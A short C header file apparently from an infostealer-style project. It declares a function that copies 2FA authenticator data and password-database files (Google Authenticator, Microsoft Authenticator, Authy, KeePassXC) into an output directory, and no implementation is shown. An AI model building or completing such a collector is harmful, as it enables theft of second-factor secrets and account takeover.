#ifndef TWOFA_H
#define TWOFA_H

#include <stddef.h>

// Collect 2FA authenticator data from known locations:
//   Google Authenticator, Microsoft Authenticator, Authy, KeePassXC
// Copies matching files (.db, .json, .csv) into output_dir.
// Returns number of files collected, -1 on error.
int twofa_collect(const char *output_dir);

#endif
